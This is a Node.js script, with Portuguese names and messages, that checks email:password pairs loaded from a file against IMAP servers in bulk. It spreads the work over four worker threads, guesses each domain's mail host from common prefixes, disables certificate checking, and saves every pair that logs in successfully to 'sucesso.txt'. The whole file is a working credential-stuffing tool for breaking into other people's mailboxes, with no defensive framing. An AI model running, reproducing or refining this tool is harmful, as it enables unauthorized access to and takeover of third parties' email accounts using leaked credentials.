const {
  Worker,
  isMainThread,
  parentPort,
  workerData,
} = require("worker_threads");
const fs = require("fs");
const imaps = require("imap-simple");


if (isMainThread) {
  const numWorkers = 4; 
  const credenciais = carregarCredenciais("PPsucesso.txt");
  const chunkSize = Math.ceil(credenciais.length / numWorkers);

  
  for (let i = 0; i < numWorkers; i++) {
    const start = i * chunkSize;
    const end = (i + 1) * chunkSize;
    const chunk = credenciais.slice(start, end);

    new Worker(__filename, {
      workerData: chunk,
    })
      .on("message", (message) => {
        console.log(message);
      })
      .on("error", (error) => {
        console.error(`Erro no worker: ${error.message}`);
      })
      .on("exit", (code) => {
        if (code !== 0) {
          console.error(`Worker terminou com código ${code}`);
        }
      });
  }
} else {
 
  async function testarCredenciais(credenciais) {
    for (const credencial of credenciais) {
      const partes = credencial.split(":");
      if (partes.length < 2) continue;

      const email = partes[0].trim();
      const senha = partes.slice(1).join(":").trim();
      if (!email || !senha) continue;

      const dominio = email.split("@")[1];
      const imapPrefixes = [
        "imap.",
        "mail.",
        "secure.",
        "imap.mail.",
        "imap.secure.",
      ];
      const port = 993;
      let sucesso = false;

      for (const prefix of imapPrefixes) {
        const host = `${prefix}${dominio}`;
        const config = {
          imap: {
            user: email,
            password: senha,
            host: host,
            port: port,
            tls: true,
            tlsOptions: { rejectUnauthorized: false },
            authTimeout: 5000,
          },
        };

        try {
          const connection = await imaps.connect(config);
          parentPort.postMessage(
            `[SUCESSO] ${email}:${senha} - Conexão bem-sucedida em ${host}`
          );
          fs.appendFileSync("sucesso.txt", `${email}:${senha}\n`);
          await connection.end();
          sucesso = true;
          break;
        } catch (err) {
          parentPort.postMessage(
            `[ERRO] ${email}:${senha} - Falha ao conectar em ${host} - ${err.message}`
          );
        }
      }

      if (!sucesso) {
        parentPort.postMessage(
          `[FALHA] ${email}:${senha} - Nenhuma conexão bem-sucedida.`
        );
      }
    }
  }

  testarCredenciais(workerData);
}

function carregarCredenciais(arquivo) {
  try {
    const dados = fs.readFileSync(arquivo, "utf-8");
    return dados.split("\n").filter(Boolean);
  } catch (err) {
    console.error(`Erro ao ler o arquivo de credenciais: ${err.message}`);
    return [];
  }
}
